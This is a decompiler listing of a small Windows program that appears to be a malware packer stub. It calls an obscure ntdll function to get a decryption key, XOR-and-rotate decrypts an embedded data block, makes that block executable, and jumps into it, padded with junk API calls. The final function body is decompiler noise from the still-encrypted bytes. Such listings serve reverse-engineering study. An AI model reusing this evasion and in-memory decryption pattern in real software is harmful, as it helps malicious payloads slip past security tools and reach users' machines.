/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __stdcall sub_423472(_DWORD *a1, unsigned int a2, int a3);
void __noreturn start(); // weak
// DWORD __stdcall GetCurrentProcessId();
// UINT __stdcall GetACP();
// UINT __stdcall GetOEMCP();
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetCurrentThreadId();

//-------------------------------------------------------------------------
// Data declarations

_DWORD dword_427000[9] =
{
  -460394439,
  -1207537599,
  1595419983,
  1853974092,
  -2041799076,
  1736375270,
  731179609,
  172103013,
  -830557822
}; // idb
CHAR ModuleName[] = "ntdll.dll"; // idb
CHAR ProcName[] = "ZwSaveMergedKeys"; // idb


//----- (00423472) --------------------------------------------------------
void __stdcall sub_423472(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // esi

  v4 = a2 >> 2;
  do
  {
    *a1 ^= a3;
    *a1 ^= 0xB2AD814A;
    *a1 ^= 0xB467B7F9;
    *a1 ^= a3;
    *a1 = __ROL4__(*a1, 23);
    *a1++ -= 1853765480;
    --v4;
  }
  while ( v4 );
}

//----- (004234D5) --------------------------------------------------------
void __noreturn start()
{
  HMODULE v0; // eax
  FARPROC ZwSaveMergedKeys; // eax
  int v2; // eax
  UINT v3; // eax
  UINT v6; // et0
  _BYTE *v7; // [esp+0h] [ebp-18h]
  _BYTE *v8; // [esp+4h] [ebp-14h]
  DWORD flOldProtect[3]; // [esp+Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  GetCurrentThreadId();
  GetCurrentProcessId();
  GetOEMCP();
  GetCurrentThreadId();
  v0 = GetModuleHandleA(ModuleName);
  ZwSaveMergedKeys = GetProcAddress(v0, ProcName);
  v2 = ((int (__stdcall *)(_DWORD, _DWORD, _DWORD))ZwSaveMergedKeys)(0, 0, 0);
  sub_423472(dword_427000, 0x7D7Du, v2);
  GetACP();
  GetACP();
  flOldProtect[2] = (DWORD)GetCommandLineA();
  VirtualProtect(dword_427000, 0x7D7Du, 0x40u, flOldProtect);
  flOldProtect[1] = (DWORD)GetCommandLineA();
  GetOEMCP();
  v3 = GetACP();
  *(_DWORD *)(v8 - 26) |= (unsigned int)&savedregs;
  *v8 = *v7;
  _ESI = v7 + 1;
  _disable();
  __asm { outsd }
  v6 = v3;
  LOBYTE(v3) = (_BYTE)_ESI;
  _ESI = v6;
  LOBYTE(v3) = v3 + 7;
  __asm { outsd }
  __outbyte(0xA4u, v3);
  _disable();
  __asm { outsb }
  __outbyte(0xC0u, v3);
  __halt();
}
// 427027: variable 'v8' is possibly undefined
// 42702A: variable 'v7' is possibly undefined
// 4234D5: using guessed type void __noreturn start();

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
